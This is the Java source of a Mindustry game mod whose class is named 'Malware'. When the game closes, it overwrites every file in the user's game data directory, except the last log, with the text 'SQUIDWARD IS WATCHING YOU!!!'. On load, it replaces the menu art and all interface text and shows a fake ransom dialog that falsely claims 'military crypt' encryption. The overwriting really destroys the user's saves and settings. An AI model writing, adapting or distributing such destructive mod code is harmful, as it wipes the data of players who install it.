package o;

import arc.Core;
import arc.Events;
import arc.graphics.g2d.Draw;
import arc.graphics.g2d.SortedSpriteBatch;
import arc.graphics.g2d.TextureRegion;
import arc.scene.ui.Dialog;
import arc.util.Log;
import arc.util.Reflect;

import mindustry.Vars;
import mindustry.game.EventType;
import mindustry.graphics.MenuRenderer;
import mindustry.mod.Mod;
import mindustry.ui.dialogs.BaseDialog;
import mindustry.ui.fragments.MenuFragment;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

public class Malware extends Mod {
    public Malware() {
        Events.run(EventType.DisposeEvent.class, () -> {
            Core.settings.getDataDirectory().walk(fi -> {
                var name = fi.name();
                if(name.equals("last_log.txt")) {
                    return;
                }

                Log.info("Encrypting file: " + fi);
                try {
                    fi.writeString("SQUIDWARD IS WATCHING YOU!!!");
                } catch(Throwable ignored) {
                }
            });
        });

        Events.run(EventType.ClientLoadEvent.class, () -> {
            Vars.mods.getMod(Malware.class).meta.displayName = "[red]hecker is inside";
            final MalwareBatch batch = new MalwareBatch();

            final TextureRegion region = Core.atlas.find("malware-img");
            Reflect.set(MenuFragment.class, Vars.ui.menufrag, "renderer", new MenuRenderer() {
                @Override
                public void render() {
                    batch.ra = false;
                    float w = Core.scene.getWidth();
                    float h = Core.scene.getHeight();
                    Draw.rect(region, w/2, h/2, w, h);
                    batch.ra = true;
                }
            });

            var prop = Core.bundle.getProperties();
            for(var key : prop.keys()) {
                prop.put(key, "SQUIDWARD IS WATCHING YOU!!!");
            }
            Core.bundle.setProperties(prop);

            Class<?> cl = SortedSpriteBatch.class;
            while(cl != null) {
                for(Field field : cl.getDeclaredFields()) {
                    if(Modifier.isFinal(field.getModifiers())) continue;
                    Reflect.set(cl, batch, field.getName(), Reflect.get(cl, Core.batch, field.getName()));
                }

                cl = cl.getSuperclass();
            }
            Core.batch = batch;

            Dialog dialog = new BaseDialog("MALWARE");
            dialog.cont.add("Hecker heck you pc, all files in %MINDUSTRY_DATA_DIR%").row();
            dialog.cont.add("(a.k.a. " + Core.settings.getDataDirectory() + ")").row();
            dialog.cont.add("will be encrypted using military crypt algorithm").row();
            dialog.cont.add("we do not bear any responsibility for the damage it may cause, we warned that it is a virus");
            dialog.addCloseButton();
            dialog.show();
        });
    }
}